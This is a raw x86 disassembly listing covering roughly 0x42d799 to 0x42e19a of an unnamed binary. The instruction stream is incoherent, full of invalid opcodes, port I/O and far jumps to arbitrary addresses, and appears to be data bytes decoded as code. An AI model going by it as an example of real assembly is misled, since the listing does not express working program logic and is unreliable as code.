  42d799:	xor    BYTE PTR [edi],0xe8
  42d79c:	arpl   di,cx
  42d79e:	lahf   
  42d79f:	std    
  42d7a0:	ficom  DWORD PTR [edi]
  42d7a2:	aam    0x6b
  42d7a4:	ret    
  42d7a5:	scas   eax,DWORD PTR es:[edi]
  42d7a6:	fistp  WORD PTR [esi+0x68e35b78]
  42d7ac:	mov    ah,0x33
  42d7ae:	sub    eax,DWORD PTR [edi+0xff5db75]
  42d7b4:	mov    al,0x0
	...
  42d816:	xchg   esi,eax
  42d817:	fwait
  42d818:	cwde   
  42d819:	pop    edi
  42d81a:	popf   
  42d81b:	pop    edi
  42d81c:	xlat   BYTE PTR ds:[ebx]
  42d81d:	fld    TBYTE PTR [eax-0x2b]
  42d820:	push   0x4282d95
  42d825:	xchg   ebp,eax
  42d826:	fs out 0x1,eax
  42d829:	add    BYTE PTR [edi],al
  42d82b:	add    DWORD PTR [eax],eax
  42d82d:	add    BYTE PTR ds:0x69e5198,al
  42d833:	cmp    dh,BYTE PTR [ecx-0x5c]
  42d836:	lahf   
  42d837:	add    BYTE PTR [ecx+0x64],al
  42d83a:	lods   al,BYTE PTR ds:[esi]
  42d83b:	test   BYTE PTR [ebx-0x15],0xe2
  42d83f:	adc    BYTE PTR ds:0x6a496c32,cl
  42d845:	iret   
  42d846:	xchg   edx,eax
  42d847:	pusha  
  42d848:	and    DWORD PTR [edi-0x48331f6],ecx
  42d84e:	mov    ebp,?
  42d850:	vxorps ymm6,ymm4,YMMWORD PTR [esi+0x3a]
  42d855:	int3   
  42d856:	xchg   esi,eax
  42d857:	inc    ecx
  42d858:	shr    BYTE PTR ds:0xaf4c3b6d,cl
  42d85e:	mov    esi,0xdcb96c41
  42d863:	mov    al,ds:0xa90d982c
  42d868:	dec    ebx
  42d869:	jns    0x42d854
  42d86b:	dec    edi
  42d86c:	push   0xc3cb221
  42d871:	inc    esp
  42d872:	dec    ecx
  42d873:	mov    eax,ds:0xa1415ed8
  42d878:	and    al,BYTE PTR ds:0x920d6df4
  42d87e:	xor    BYTE PTR [esi+0x5ee48c3c],ah
  42d884:	call   0x2a43f138
  42d889:	loope  0x42d833
  42d88b:	aad    0x20
  42d88d:	mov    al,0xa9
  42d88f:	mov    DWORD PTR [eax+0x186fee74],edx
  42d895:	and    dl,ch
  42d897:	out    dx,eax
  42d898:	cld    
  42d899:	mov    bh,0xfa
  42d89b:	mov    ds:0xb157c96e,al
  42d8a0:	cld    
  42d8a1:	mov    ebx,0x73931c2f
  42d8a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d8a7:	bound  ebp,QWORD PTR [eax+0x161b650c]
  42d8ad:	jl     0x42d83b
  42d8af:	ja     0x42d8c5
  42d8b1:	popf   
  42d8b2:	pop    edx
  42d8b3:	rcr    DWORD PTR [edi],0x7c
  42d8b6:	push   edi
  42d8b7:	shr    BYTE PTR [ebp-0x55],1
  42d8ba:	jl     0x42d8e8
  42d8bc:	pop    ss
  42d8bd:	loope  0x42d8a8
  42d8bf:	dec    esp
  42d8c0:	and    ecx,esi
  42d8c2:	shl    DWORD PTR [ebp+0x54],1
  42d8c5:	xchg   edx,eax
  42d8c6:	push   0x1c
  42d8c8:	shl    BYTE PTR [esi],1
  42d8ca:	jecxz  0x42d867
  42d8cc:	fisttp WORD PTR [edi-0x67]
  42d8cf:	push   ds
  42d8d0:	xchg   edi,eax
  42d8d1:	xchg   DWORD PTR [edx+ebx*4-0x6d13a7c8],edi
  42d8d8:	ds gs jmp 0xc983bc8e
  42d8df:	dec    esi
  42d8e0:	test   DWORD PTR [edi],0x1a03db63
  42d8e6:	push   eax
  42d8e7:	mov    ebx,0x5137aec5
  42d8ec:	inc    ecx
  42d8ed:	inc    ebx
  42d8ee:	cld    
  42d8ef:	mov    ah,0x3f
  42d8f1:	sub    dh,BYTE PTR [ecx+0x6886b251]
  42d8f7:	imul   esp,DWORD PTR [ecx],0xffffff9b
  42d8fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d8fb:	add    BYTE PTR [esi+0x5cdf92da],bh
  42d901:	aaa    
  42d902:	push   ds
  42d903:	xchg   ecx,eax
  42d904:	mov    esp,0xb1c0ef44
  42d909:	jbe    0x42d89b
  42d90b:	dec    esi
  42d90c:	fld    st(2)
  42d90e:	mov    al,ds:0xff0bd23e
  42d913:	pop    ecx
  42d914:	push   esi
  42d915:	push   edi
  42d916:	pop    edx
  42d917:	xchg   edi,eax
  42d918:	js     0x42d947
  42d91a:	int    0x32
  42d91c:	add    BYTE PTR [edi+edx*4+0x4a],dl
  42d920:	outs   dx,BYTE PTR ds:[esi]
  42d921:	sbb    ch,BYTE PTR [esi-0x20bff829]
  42d927:	stos   BYTE PTR es:[edi],al
  42d928:	and    al,0xa2
  42d92a:	repnz cmp eax,0x54f75fb0
  42d930:	imul   eax,eax,0x73c29e
	...
  42d996:	stc    
  42d997:	mov    cl,0x70
  42d999:	dec    eax
  42d99a:	js     0x42d965
  42d99c:	stc    
  42d99d:	mov    cl,0xcb
  42d99f:	mov    DWORD PTR ds:0x5df85314,ecx
  42d9a5:	jno    0x42da12
  42d9a7:	call   0x149d9ad
  42d9ac:	add    BYTE PTR [eax],al
  42d9ae:	add    BYTE PTR [ecx-0x9],dl
  42d9b1:	add    al,0xc5
  42d9b3:	fmul   st,st(1)
  42d9b5:	jnp    0x42d9d1
  42d9b7:	stos   BYTE PTR es:[edi],al
  42d9b8:	jle    0x42d997
  42d9ba:	(bad)  
  42d9bb:	mov    al,ds:0xb6c9965d
  42d9c0:	adc    eax,0xe65aed68
  42d9c5:	xchg   edx,eax
  42d9c6:	ins    DWORD PTR es:[edi],dx
  42d9c7:	icebp  
  42d9c8:	sub    ebx,DWORD PTR [ecx-0x16]
  42d9cb:	mov    edi,0xee4d22ac
  42d9d0:	and    DWORD PTR [ebx+ebp*4],edx
  42d9d3:	add    ch,bl
  42d9d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d9d6:	xor    ah,al
  42d9d8:	pop    esp
  42d9d9:	(bad)  
  42d9da:	lods   al,BYTE PTR ds:[esi]
  42d9db:	add    ecx,0xc8cf9d98
  42d9e1:	hlt    
  42d9e2:	mov    edi,0x442e2737
  42d9e7:	cmp    BYTE PTR [esi],dh
  42d9e9:	pop    esi
  42d9ea:	jle    0x42d9c7
  42d9ec:	jbe    0x42da2c
  42d9ee:	push   ebx
  42d9ef:	aas    
  42d9f0:	fsubr  st(0),st
  42d9f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d9f3:	ror    ecx,0xb6
  42d9f6:	inc    eax
  42d9f7:	xadd   DWORD PTR [eax],ecx
  42d9fa:	das    
  42d9fb:	adc    edi,edi
  42d9fd:	int3   
  42d9fe:	shr    BYTE PTR [eax+0x0],0x3
  42da02:	out    0x13,eax
  42da04:	in     al,dx
  42da05:	aaa    
  42da06:	jne    0x42d9b6
  42da08:	int3   
  42da09:	push   ebp
  42da0a:	out    0xa9,eax
  42da0c:	fistp  DWORD PTR [edi-0x75]
  42da0f:	not    DWORD PTR [ecx+0x70a7cfdf]
  42da15:	xor    al,0x6e
  42da17:	pop    eax
  42da18:	in     eax,0x53
  42da1a:	loop   0x42da67
  42da1c:	sahf   
  42da1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da1e:	sub    eax,0x2bcb31c5
  42da23:	lods   eax,DWORD PTR ds:[esi]
  42da24:	int3   
  42da25:	xchg   edx,eax
  42da26:	add    BYTE PTR [esp],al
  42da29:	pop    edx
  42da2a:	xchg   esp,eax
  42da2b:	(bad)
  42da2f:	jno    0x42d9e7
  42da31:	call   0x64b25acc
  42da36:	mov    WORD PTR [edi-0xb],ds
  42da39:	inc    edi
  42da3a:	call   0x881:0x35ad12ba
  42da41:	ret    0x7d0b
  42da44:	(bad)  
  42da45:	jmp    DWORD PTR [edx+eax*4-0x21]
  42da49:	sub    eax,0x9762558
  42da4e:	lock pop es
  42da50:	ret    0x67cb
  42da53:	xor    BYTE PTR [eax+0x12],bh
  42da56:	jo     0x42da38
  42da58:	aas    
  42da59:	mov    edx,0x9690c5f9
  42da5e:	lods   eax,DWORD PTR ds:[esi]
  42da5f:	cs sbb al,0x9f
  42da62:	xchg   edx,eax
  42da63:	mov    ds:0x27826c4d,al
  42da68:	add    al,0x5a
  42da6a:	inc    esi
  42da6b:	jp     0x42dadd
  42da6d:	(bad)  
  42da6e:	jnp    0x42da23
  42da70:	xchg   DWORD PTR [ebx],eax
  42da72:	xchg   edx,eax
  42da73:	(bad)  
  42da74:	rol    al,0x6
  42da77:	fstp   DWORD PTR [ebx-0x7d01d80c]
  42da7d:	xor    cl,BYTE PTR [ecx]
  42da7f:	scas   eax,DWORD PTR es:[edi]
  42da80:	das    
  42da81:	repnz std 
  42da83:	je     0x42dafe
  42da85:	dec    edx
  42da86:	jp     0x42da7c
  42da88:	addr16 aad 0xf4
  42da8b:	mov    dh,0xc4
  42da8d:	dec    ebp
  42da8e:	xor    bl,BYTE PTR [ebp+0x109dd37b]
  42da94:	iret   
  42da95:	nop
  42da96:	ror    DWORD PTR [esi+ecx*1+0x1a296903],0x56
  42da9e:	ret    
  42da9f:	scas   al,BYTE PTR es:[edi]
  42daa0:	sbb    BYTE PTR [edx+0x4c],0x27
  42daa4:	add    al,ch
  42daa6:	dec    edx
  42daa7:	lods   eax,DWORD PTR ds:[esi]
  42daa8:	adc    ebx,DWORD PTR [ecx-0x73]
  42daab:	and    eax,0x225054f1
  42dab0:	mov    ds:0x6b60505b,eax
	...
  42db15:	add    BYTE PTR [eax-0x2093e086],dh
  42db1b:	ins    DWORD PTR es:[edi],dx
  42db1c:	repz inc cl
  42db1f:	jae    0x42db79
  42db21:	jg     0x42db40
  42db23:	sub    esi,DWORD PTR [eax+0x1e9720d]
  42db29:	add    BYTE PTR [edi],al
  42db2b:	add    DWORD PTR [eax],eax
  42db2d:	add    BYTE PTR [edi-0x472b0410],al
  42db33:	jmp    0x105142
  42db38:	div    DWORD PTR [eax-0x1c]
  42db3b:	ins    DWORD PTR es:[edi],dx
  42db3c:	mov    bl,0xb1
  42db3e:	inc    eax
  42db3f:	cmp    BYTE PTR [esi+0x28baa66],dh
  42db45:	ins    BYTE PTR es:[edi],dx
  42db46:	aam    0xb7
  42db48:	pop    ds
  42db49:	jecxz  0x42daf5
  42db4b:	mov    al,ds:0xe61b6ab8
  42db50:	xor    eax,0x2693146c
  42db55:	aaa    
  42db56:	stc    
  42db57:	or     DWORD PTR [eax-0x2d],esi
  42db5a:	and    al,0x2c
  42db5c:	mov    ebx,0x7f0e078d
  42db61:	pop    edi
  42db62:	or     BYTE PTR [esi+0x2e],bl
  42db65:	imul   edx,DWORD PTR [esi-0x6c],0xa537982e
  42db6c:	cmp    al,0x70
  42db6e:	cs mov cl,0xb
  42db71:	fs or  eax,0xff16d6f3
  42db77:	lock or al,0x4
  42db7a:	xchg   BYTE PTR [esi-0x1659ca00],bh
  42db80:	xchg   ebp,eax
  42db81:	pop    DWORD PTR [ebx-0x6c4cb754]
  42db87:	in     al,dx
  42db88:	fs pop eax
  42db8a:	pop    esp
  42db8b:	bound  ecx,QWORD PTR [ebx]
  42db8d:	pushf  
  42db8e:	fcomp  DWORD PTR [edx-0x22f0ff02]
  42db94:	test   BYTE PTR [ebx+ebp*1-0x490e107b],dl
  42db9b:	dec    ebp
  42db9c:	jnp    0x42dbc2
  42db9e:	xor    ecx,DWORD PTR [esi-0x38]
  42dba1:	cs daa 
  42dba3:	popf   
  42dba4:	ds sbb al,0xe7
  42dba7:	shl    BYTE PTR [ebp+0x63],cl
  42dbaa:	cmp    dh,BYTE PTR [eax+0x1b]
  42dbad:	cdq    
  42dbae:	xor    edi,DWORD PTR [eax+0x63]
  42dbb1:	and    bh,ch
  42dbb3:	cs pushw ds
  42dbb6:	cmp    dh,BYTE PTR [ebp-0x742c32ff]
  42dbbc:	pop    esp
  42dbbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dbbe:	popa   
  42dbbf:	fmul   DWORD PTR [eax+0x24]
  42dbc2:	jb     0x42dc2e
  42dbc4:	frstor ss:[esi+0x204b9933]
  42dbcb:	stos   DWORD PTR es:[edi],eax
  42dbcc:	inc    eax
  42dbcd:	stos   DWORD PTR es:[edi],eax
  42dbce:	dec    esp
  42dbcf:	xchg   esp,eax
  42dbd0:	imul   ebp,DWORD PTR fs:0x5629423f,0x4335d1d6
  42dbdb:	retf   0xec3a
  42dbde:	dec    esp
  42dbdf:	mov    cl,0x9a
  42dbe1:	cmc    
  42dbe2:	aam    0x51
  42dbe4:	and    BYTE PTR [ecx+0x39],al
  42dbe7:	clc    
  42dbe8:	sbb    BYTE PTR [eax-0x24fc3bab],0x67
  42dbef:	out    0x93,eax
  42dbf1:	push   ss
  42dbf2:	mov    ch,0x8e
  42dbf4:	les    edx,FWORD PTR [esi+0x6f625c95]
  42dbfa:	mov    ebp,0xd1775d16
  42dbff:	jae    0x42dc54
  42dc01:	and    DWORD PTR ds:0x2b3958e7,ebp
  42dc07:	rcl    DWORD PTR [edi-0x51],cl
  42dc0a:	stos   WORD PTR es:[edi],ax
  42dc0c:	adc    al,0x22
  42dc0e:	(bad)  
  42dc0f:	xchg   edi,eax
  42dc10:	mov    esi,ebx
  42dc12:	outs   dx,BYTE PTR ds:[esi]
  42dc13:	fcom   QWORD PTR [esi]
  42dc15:	xor    ecx,DWORD PTR [edx+0x64]
  42dc18:	lea    eax,[eax+0x23]
  42dc1b:	or     ecx,edi
  42dc1d:	fwait
  42dc1e:	imul   DWORD PTR [ebp+esi*8-0x14]
  42dc22:	rol    cl,cl
  42dc24:	inc    eax
  42dc25:	mov    cl,0xed
  42dc27:	push   ds
  42dc28:	xchg   edi,eax
  42dc29:	loope  0x42dc8a
  42dc2b:	mov    edx,0xda732257
  42dc30:	pop    edx
  42dc31:	je     0x42dcb0
  42dc33:	sub    edi,DWORD PTR [esi+0x0]
	...
  42dc95:	add    BYTE PTR [ecx],bh
  42dc97:	mov    bh,0x6d
  42dc99:	pxor   mm3,mm7
  42dc9c:	jnp    0x42dc55
  42dc9e:	es mov esp,0x2b2df285
  42dca4:	shl    BYTE PTR [eax+0x79],0xea
  42dca8:	add    DWORD PTR [eax],eax
  42dcaa:	pop    es
  42dcab:	add    DWORD PTR [eax],eax
  42dcad:	add    BYTE PTR [ecx+0x7e34067],dl
  42dcb3:	push   esi
  42dcb4:	stc    
  42dcb5:	xchg   edi,eax
  42dcb6:	inc    edx
  42dcb7:	cdq    
  42dcb8:	add    DWORD PTR [eax+ebp*2-0x45ab17b7],0x11
  42dcc0:	mov    ds:0xc53cd026,al
  42dcc5:	clc    
  42dcc6:	jle    0x42dd22
  42dcc8:	retf   0x5150
  42dccb:	ins    DWORD PTR es:[edi],dx
  42dccc:	bndstx [eax-0x693ca68c],(bad)
  42dcd3:	or     BYTE PTR [eax],cl
  42dcd5:	inc    edx
  42dcd6:	and    al,0x9b
  42dcd8:	jnp    0x42dc90
  42dcda:	adc    DWORD PTR [ebx-0x6e],esi
  42dcdd:	pop    ss
  42dcde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dcdf:	leave  
  42dce0:	xchg   ecx,eax
  42dce1:	stos   DWORD PTR es:[edi],eax
  42dce2:	jle    0x42dc7b
  42dce4:	or     ebx,edi
  42dce6:	iret   
  42dce7:	jne    0x42dd4a
  42dce9:	dec    esi
  42dcea:	mov    dh,0x9
  42dcec:	retf   0xde4
  42dcef:	mov    al,ds:0x82cba30d
  42dcf4:	jno    0x42dd32
  42dcf6:	ja     0x42dc80
  42dcf8:	out    dx,eax
  42dcf9:	ror    DWORD PTR [ebp+0x40],0x88
  42dcfd:	ror    DWORD PTR [esi-0x74054279],1
  42dd03:	adc    eax,0xeba4ba95
  42dd08:	sbb    esp,ecx
  42dd0a:	pop    edi
  42dd0b:	mov    ebx,0x9c10b0ce
  42dd10:	in     eax,dx
  42dd11:	mov    dh,dl
  42dd13:	js     0x42dd5b
  42dd15:	and    bh,BYTE PTR [ebx+ecx*1-0x67]
  42dd19:	pop    ebp
  42dd1a:	addr16 pop esp
  42dd1c:	or     eax,0xd1ed1599
  42dd21:	in     al,dx
  42dd22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dd23:	push   ds
  42dd24:	xchg   ecx,eax
  42dd25:	loopne 0x42dcee
  42dd27:	loopne 0x42dd91
  42dd29:	or     edx,DWORD PTR [edx+0x78]
  42dd2c:	sub    al,0xd
  42dd2e:	cmp    al,0x73
  42dd30:	jmp    0x30c8:0xcfcb5d02
  42dd37:	enter  0xdd5a,0x85
  42dd3b:	fld    DWORD PTR [esi+0x67]
  42dd3e:	daa    
  42dd3f:	mov    ds:0xa823c68b,al
  42dd44:	add    eax,0xce1cc979
  42dd49:	or     DWORD PTR [ebp-0x27],ebp
  42dd4c:	gs push edi
  42dd4e:	call   0x1b1c:0x17c8253
  42dd55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dd56:	adc    eax,0x9f5c986c
  42dd5b:	or     eax,0xcbd4c848
  42dd60:	push   0xffffffa7
  42dd62:	xchg   bl,ch
  42dd64:	mov    eax,ds:0x1bef66f9
  42dd69:	lods   al,BYTE PTR ds:[esi]
  42dd6a:	bound  esp,QWORD PTR [ebx-0x2cae6d12]
  42dd70:	pop    edi
  42dd71:	pop    ebx
  42dd72:	inc    ecx
  42dd73:	pop    esi
  42dd74:	out    dx,eax
  42dd75:	mov    esi,0xd185aa88
  42dd7a:	dec    esp
  42dd7b:	fyl2x  
  42dd7d:	fcmovb st,st(2)
  42dd7f:	mov    ebx,0x9a1786d5
  42dd84:	jns    0x42dd42
  42dd86:	mov    ebx,0x4aaa9cd3
  42dd8b:	aam    0xf5
  42dd8d:	xchg   ebp,eax
  42dd8e:	mov    BYTE PTR [ebx],ah
  42dd90:	push   ebp
  42dd92:	mov    WORD PTR [ecx+ecx*1-0x5e],fs
  42dd96:	in     eax,dx
  42dd97:	aam    0x20
  42dd99:	jbe    0x42ddd1
  42dd9b:	or     al,0x31
  42dd9d:	cli    
  42dd9e:	xchg   ebx,eax
  42dd9f:	call   FWORD PTR [eax+0x1e6cc95]
  42dda5:	arpl   di,dx
  42dda7:	cli    
  42dda8:	pop    esi
  42dda9:	xchg   ecx,eax
  42ddaa:	jae    0x42dd8d
  42ddac:	(bad)  
  42ddae:	mov    ch,ch
  42ddb0:	push   edi
  42ddb1:	pop    ss
  42ddb2:	aad    0xd2
  42ddb4:	jl     0x42ddb6
	...
  42de16:	out    0x82,al
  42de18:	lods   eax,DWORD PTR ds:[esi]
  42de19:	xor    ebp,ebp
  42de1b:	aas    
  42de1c:	(bad)  
  42de1d:	xlat   BYTE PTR ds:[ebx]
  42de1e:	jns    0x42ddf6
  42de20:	mov    ebp,0x51f62e07
  42de25:	repz sub bl,0x1
  42de29:	add    BYTE PTR [edi],al
  42de2b:	add    DWORD PTR [eax],eax
  42de2d:	add    BYTE PTR [ebx],ah
  42de2f:	arpl   WORD PTR [ecx-0x5b],sp
  42de32:	(bad)  
  42de33:	enter  0x2d4,0x7
  42de37:	inc    ebx
  42de38:	xchg   esi,eax
  42de39:	jl     0x42de96
  42de3b:	sbb    BYTE PTR [bp+0x4d],al
  42de3f:	inc    edx
  42de40:	mov    dl,0x4
  42de42:	aam    0xd0
  42de44:	mov    esi,0x54a85a6a
  42de49:	outs   dx,BYTE PTR ds:[esi]
  42de4a:	xor    BYTE PTR [ebx],al
  42de4c:	ds and eax,0xb247d1df
  42de52:	arpl   WORD PTR [ebp-0x1e],ax
  42de55:	leave  
  42de56:	xor    BYTE PTR gs:[ebp-0x2a],dl
  42de5a:	repz jne 0x42de4a
  42de5d:	(bad)
  42de60:	or     BYTE PTR [eax],0xa4
  42de63:	sti    
  42de64:	mov    cl,0x7a
  42de66:	pop    eax
  42de67:	jp     0x42de8e
  42de69:	in     al,dx
  42de6a:	add    DWORD PTR [ecx+0x5f],eax
  42de6d:	pop    ds
  42de6e:	adc    BYTE PTR [ecx-0x3e],dl
  42de71:	test   dl,al
  42de73:	mov    cl,0x67
  42de75:	shl    DWORD PTR [ebx+0x8c343f0],cl
  42de7b:	and    DWORD PTR [ebx],edx
  42de7d:	pop    ecx
  42de7e:	jae    0x42defd
  42de80:	in     eax,0x87
  42de82:	aam    0x55
  42de84:	loope  0x42de14
  42de86:	pop    esi
  42de87:	jle    0x42dea7
  42de89:	jmp    FWORD PTR [esi]
  42de8b:	and    BYTE PTR [edx+0x17ced007],ch
  42de91:	jecxz  0x42de9e
  42de93:	dec    eax
  42de94:	lods   eax,DWORD PTR ds:[esi]
  42de95:	arpl   WORD PTR [ebx+0x15],si
  42de98:	out    dx,al
  42de99:	jle    0x42dedf
  42de9b:	pop    es
  42de9c:	lods   al,BYTE PTR ds:[esi]
  42de9d:	rol    BYTE PTR [edx+0x1],1
  42dea0:	or     al,0x84
  42dea2:	cs in  eax,0x1a
  42dea5:	les    ebp,FWORD PTR [ecx-0x3f6ae7d0]
  42deab:	cmc    
  42deac:	ret    0xa219
  42deaf:	pop    esp
  42deb0:	and    eax,0x775fe523
  42deb5:	popf   
  42deb6:	js     0x42dea0
  42deb8:	hlt    
  42deb9:	xor    DWORD PTR [edi-0x27],esi
  42debc:	scas   eax,DWORD PTR es:[edi]
  42debd:	jmp    0xf04b688c
  42dec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dec3:	xchg   ebp,eax
  42dec4:	arpl   WORD PTR [ebp-0x43],ax
  42dec7:	arpl   WORD PTR [ecx-0xc5362e8],bp
  42decd:	call   0x5ad0:0x3981972
  42ded4:	stos   DWORD PTR es:[edi],eax
  42ded5:	cs sbb eax,0x8e3ca8d1
  42dedb:	add    bl,BYTE PTR [edi+0x5c21dfdd]
  42dee1:	aas    
  42dee2:	ss aas 
  42dee4:	adc    ch,BYTE PTR [eax]
  42dee6:	fdiv   DWORD PTR [esi]
  42dee8:	sub    al,0xb6
  42deea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42deeb:	shl    DWORD PTR [ecx],1
  42deed:	cmp    eax,DWORD PTR [ebx+0x5a]
  42def0:	les    ebx,FWORD PTR [eax+0x26d81b6d]
  42def6:	xor    eax,0x89ad5819
  42defb:	enter  0x8477,0x28
  42deff:	or     esi,DWORD PTR [edx-0x28]
  42df02:	scas   al,BYTE PTR es:[edi]
  42df03:	xor    BYTE PTR [ecx+0x1e51f5b4],0x5c
  42df0a:	aas    
  42df0b:	or     DWORD PTR ds:0x52769ee4,0xfa3d1763
  42df15:	sti    
  42df16:	aas    
  42df17:	or     BYTE PTR [ecx+ecx*2+0x27],bl
  42df1b:	test   BYTE PTR [eax-0x7f05bed5],cl
  42df21:	push   ebx
  42df22:	out    0xc,eax
  42df24:	dec    eax
  42df25:	ret    
  42df26:	pop    esi
  42df27:	ja     0x42df70
  42df29:	fidivr DWORD PTR [edx-0x43]
  42df2c:	aam    0x1e
  42df2e:	jg     0x42df7f
  42df30:	xor    DWORD PTR [edi+edx*1+0xf458],ebp
	...
  42df93:	add    BYTE PTR [eax],al
  42df95:	add    BYTE PTR [edx],al
  42df97:	(bad)  
  42df98:	jb     0x42df40
  42df9a:	(bad)  
  42df9b:	scas   al,BYTE PTR es:[edi]
  42df9c:	(bad)  
  42df9d:	inc    BYTE PTR [esi]
  42df9f:	out    dx,al
  42dfa0:	dec    eax
  42dfa1:	out    dx,eax
  42dfa2:	addr16 push eax
  42dfa4:	lock fld QWORD PTR [edi+0x70001ec]
  42dfab:	add    DWORD PTR [eax],eax
  42dfad:	add    al,dl
  42dfaf:	adc    al,0xa9
  42dfb1:	mov    dh,0xcd
  42dfb3:	dec    esp
  42dfb4:	outs   dx,BYTE PTR ds:[esi]
  42dfb5:	add    edi,DWORD PTR [ecx+0x47]
  42dfb8:	mov    ds:0xfdce1bf9,al
  42dfbd:	inc    esi
  42dfbe:	pop    eax
  42dfbf:	shl    DWORD PTR [ebp+0x1a],0xc2
  42dfc3:	lods   al,BYTE PTR ds:[esi]
  42dfc4:	cli    
  42dfc5:	stc    
  42dfc6:	push   eax
  42dfc7:	add    bl,BYTE PTR [eax]
  42dfc9:	ins    DWORD PTR es:[edi],dx
  42dfca:	xor    edx,DWORD PTR [eax+0x781de71a]
  42dfd0:	daa    
  42dfd1:	xchg   esp,eax
  42dfd2:	pop    es
  42dfd3:	es stos BYTE PTR es:[edi],al
  42dfd5:	enter  0xae1e,0xe3
  42dfd9:	std    
  42dfda:	mov    esi,0xd637f375
  42dfdf:	or     DWORD PTR [esi+ecx*8+0x373dc011],ecx
  42dfe6:	inc    ebx
  42dfe7:	cmp    ebp,ecx
  42dfe9:	ja     0x42df71
  42dfeb:	(bad)  
  42dfec:	mov    eax,ds:0x4450d2d3
  42dff1:	in     al,0x5b
  42dff3:	inc    ecx
  42dff4:	adc    ah,BYTE PTR [esi+0xcee888e]
  42dffa:	xchg   esi,eax
  42dffb:	jmp    0x9e2f:0x38a17b45
  42e002:	mov    ds:0x7d1eeea2,al
  42e007:	pop    esi
  42e008:	imul   esi,DWORD PTR [eax-0x2f33ab1],0xb425bc89
  42e012:	cmp    bl,0xa3
  42e015:	and    BYTE PTR [eax],0x5a
  42e018:	mov    ebp,0x94078fbc
  42e01d:	xlat   BYTE PTR ds:[ebx]
  42e01e:	adc    esp,DWORD PTR [bp+si]
  42e021:	xchg   esi,eax
  42e022:	pop    ebx
  42e023:	test   esp,0xe57fb754
  42e029:	pop    ss
  42e02a:	jns    0x42dfe1
  42e02c:	xchg   DWORD PTR [ecx],ecx
  42e02e:	lods   al,BYTE PTR ds:[esi]
  42e02f:	adc    dh,0xbd
  42e032:	(bad)  
  42e033:	(bad)  
  42e034:	pushw  es
  42e036:	in     al,0xa0
  42e038:	inc    esi
  42e039:	nop
  42e03a:	sbb    DWORD PTR ds:0x4c0db65a,edx
  42e040:	pusha  
  42e041:	inc    esi
  42e042:	sbb    dh,BYTE PTR ds:0x4353a70c
  42e048:	test   DWORD PTR [esi],eax
  42e04a:	imul   ecx,DWORD PTR ss:[ebx-0x15c90390],0xadf21a66
  42e055:	xchg   DWORD PTR [edx-0x4227a077],ecx
  42e05b:	cmp    ah,BYTE PTR [ebp+eiz*8-0x3e]
  42e05f:	and    DWORD PTR [esi+0x36042839],eax
  42e065:	popa   
  42e066:	lahf   
  42e067:	dec    esi
  42e068:	jbe    0x42e04d
  42e06a:	dec    edi
  42e06b:	lods   al,BYTE PTR ds:[esi]
  42e06c:	ret    0xa8c
  42e06f:	cld    
  42e070:	cs pop esi
  42e072:	scas   eax,DWORD PTR es:[edi]
  42e073:	and    BYTE PTR [edi-0x16],dh
  42e076:	add    al,0x1c
  42e078:	cmp    DWORD PTR [edx],ebp
  42e07a:	jecxz  0x42e0c1
  42e07c:	xchg   edx,eax
  42e07d:	cmp    al,0x3
  42e07f:	sbb    BYTE PTR [ebx],ch
  42e081:	and    eax,0x7725b665
  42e086:	mov    edx,0x97635b83
  42e08b:	in     eax,dx
  42e08c:	dec    esp
  42e08d:	sub    al,0x24
  42e08f:	mov    ds:0xb23f6a03,eax
  42e094:	into   
  42e095:	mov    DWORD PTR [edi+0x1a150766],ebp
  42e09b:	cdq    
  42e09c:	mov    eax,0xcada8d33
  42e0a1:	cmp    al,0xe6
  42e0a3:	test   al,0xe2
  42e0a5:	test   DWORD PTR [ecx],ebp
  42e0a7:	or     al,0x4
  42e0a9:	arpl   WORD PTR [esi-0x219dd479],bx
  42e0af:	push   edi
  42e0b0:	js     0x42e0e2
  42e0b2:	lods   eax,DWORD PTR ds:[si]
  42e0b4:	jmp    0x0:0x0
	...
  42e113:	add    BYTE PTR [eax],al
  42e115:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e11b:	xlat   BYTE PTR ds:[ebx]
  42e11c:	mov    ecx,0xcf7f7fef
  42e121:	(bad)  
  42e122:	xor    eax,DWORD PTR [esi-0x12719750]
  42e128:	add    DWORD PTR [eax],eax
  42e12a:	pop    es
  42e12b:	add    DWORD PTR [eax],eax
  42e12d:	add    BYTE PTR [ebp-0x24],cl
  42e130:	bound  ecx,QWORD PTR [esi+0x50]
  42e133:	idiv   BYTE PTR [edx-0x593640b1]
  42e139:	or     eax,DWORD PTR [ebp+0x19]
  42e13c:	xchg   BYTE PTR [ebp-0x45451ff],ah
  42e142:	arpl   WORD PTR [ecx-0x79],di
  42e145:	add    al,BYTE PTR [ebp-0x22806706]
  42e14b:	ins    DWORD PTR es:[edi],dx
  42e14c:	aaa    
  42e14d:	rcl    BYTE PTR [edi+0x2226ad5e],1
  42e153:	mov    ch,ah
  42e155:	xor    BYTE PTR [edx],al
  42e157:	fnstcw WORD PTR [eax+0x63]
  42e15a:	bnd ret 0x727e
  42e15e:	sub    dh,0xc7
  42e161:	push   eax
  42e162:	pop    eax
  42e163:	dec    esp
  42e164:	imul   edx,DWORD PTR [esi],0xffffffec
  42e167:	sub    al,0xf8
  42e169:	xchg   ch,cl
  42e16b:	sbb    esi,0x51fa7aa1
  42e171:	xor    DWORD PTR ds:0x805cd98a,eax
  42e177:	mov    dl,0xfc
  42e179:	dec    ecx
  42e17a:	cmp    eax,0x9edf2358
  42e17f:	or     ah,BYTE PTR [edi+0x5f0931e9]
  42e185:	mov    cl,0x6f
  42e187:	mov    esi,0xe2cff710
  42e18c:	iret   
  42e18d:	popf   
  42e18e:	addr16 sti 
  42e190:	mov    eax,ds:0xe12aa521
  42e195:	and    ch,BYTE PTR [ecx]
  42e197:	dec    eax
  42e198:	fdivr  QWORD PTR [edx]
  42e19a:	scas   eax,DWORD PTR es:[edi]
